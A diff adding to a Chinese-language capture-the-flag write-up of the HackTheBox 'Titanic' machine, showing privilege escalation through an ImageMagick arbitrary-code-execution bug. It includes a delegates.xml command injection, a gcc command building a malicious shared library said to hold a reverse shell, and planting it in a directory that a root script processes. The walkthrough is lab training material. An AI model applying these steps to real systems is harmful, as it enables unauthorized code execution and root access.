@@ -130,7 +130,7 @@ administrator 为 Gitea admin 用户：	破解后可用于控制整个平台｜d
 ```
 $ ssh developer@10.129.231.221
 ```
-## 7
+## 7.目标为启动identify_images.sh脚本
 ```
 developer@titanic:/opt/scripts$ ls   // 通常用来存放各种脚本的路径/opt/scripts/
 identify_images.sh
@@ -146,8 +146,77 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 //xargs：把输入的文件名列表一一传给后面的命令；magick 是 ImageMagick 图像处理工具的主命令；对每张图片执行 identify，提取其基本元数据
 //>> 表示将输出“追加”写入到 metadata.log 文件中（不会覆盖原有内容）
 ```
+### [1]$ /usr/bin/magick -version
+![beautiful day](images/080310.png)
+Google: ImageMagick 7.1.1-35 expolit  //AppImage 版本 ImageMagick 中的任意代码执行漏洞
 
-                              
+攻击者常用 /dev/shm 储存恶意脚本或 payload，因为：快速、不落地 ｜一般不会被杀毒或日志记录 ｜ 重启即清除，不留痕
+
+/dev/shm 是基于内存（RAM）的虚拟文件系统，供进程间共享数据（如共享内存 IPC）或临时高速缓存使用；｜通常在启动时由系统自动挂载到 /dev/shm
+![beautiful day](images/080311.png)
+
+```
+//delegates.xml在当前工作目录中创建一个文件：
+cat << EOF > ./delegates.xml
+<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
+EOF
+```
+解析：“Here Document”（缩写为 heredoc）是 Bash 和其他 shell 中的一种将多行字符串作为输入的语法方式，常用于生成文件或传递多行文本
+```
+cat << EOF           //这是 Here Document（heredoc） 语法
+> ./delegates.xml    //	把标准输入的内容重定向输出到 delegates.xml 文件中（覆盖写入）
+<delegatemap>...     //是写入的 XML 内容
+EOF                  //heredoc 结束标志，写在行首表示输入结束
+
+<delegate xmlns="" decode="XML" command="id"/>
+<delegatemap>        //ImageMagick 的 delegate 配置根标签
+<delegate>           //定义一个“代理操作”
+xmlns=""             //XML 命名空间，留空
+decode="XML"         //指定处理的数据类型是 XML
+command="id"         //这里注入了系统命令 id，目的是执行并输出当前用户信息
+```
+运行ImageMagick以delegates.xml验证命令id是否已执行：
+```
+developer@titanic:/dev/shm$ /usr/bin/magick identify delegates.xml  //验证
+
+developer@titanic:/dev/shm$ mv delegates.xml delegates.jpg
+developer@titanic:/dev/shm$ magick identify delegates.jpg
+```
+
+### [2]在当前工作目录中创建共享库：  
+```
+developer@titanic:/dev/shm$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+```
+![beautiful day](images/080313.png)
+
+解析：
+
+gcc -x c :GNU C 编译器,强制将输入解释为 C 语言
+
+-shared:	编译为共享库（.so 文件）
+
+-fPIC:	生成与位置无关的代码（适用于动态链接库）
+
+-o ./libxcb.so.1:	指定输出文件名为 libxcb.so.1
+
+<< EOF ... EOF:	heredoc，将下面的 C 代码传入 gcc 编译
+```
+这三行是引入标准头文件，用于后续调用函数：
+<stdio.h>：标准输入输出库，比如 printf()
+<stdlib.h>：包含 system() 和 exit()
+<unistd.h>：提供 exec()、fork() 等 UNIX 系统调用（虽然这里没用到）
+
+__attribute__((constructor)) 会让这个函数 init() 在共享库被加载时自动运行，在 main() 之前执行
+```
+### [3]植入反向shell
+![beautiful day](images/080314.png)
+反向shell在libxcb.so.1，把它拷贝到指定路径，挺重要一步的
+```
+developer@titanic:/dev/shm$ cp libxcb.so.1 /opt/app/static/assets/images/
+```
+这一次，后nc,竟然直接就连上了
+![beautiful day](images/080315.png)
+
 
 
 
